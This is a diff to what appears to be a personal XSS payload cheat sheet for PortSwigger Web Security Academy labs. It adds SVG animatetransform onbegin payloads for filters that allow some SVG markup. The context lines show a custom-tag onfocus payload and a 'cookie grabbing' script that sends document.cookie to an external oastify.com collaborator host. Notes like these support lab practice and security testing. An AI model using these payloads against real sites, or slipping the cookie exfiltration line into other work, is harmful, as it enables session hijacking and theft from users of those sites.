@@ -84,7 +84,10 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-cont
 <custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
 ```
 ### Reflected XSS with some SVG markup allowed
-
+```
+"><svg><animatetransform onbegin=alert(1337)></animatetransform></svg>
+"><svg><animatetransform onbegin='alert(1337)'></animatetransform></svg>
+```
 #### For cookie grabbing
 ```js
 <script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
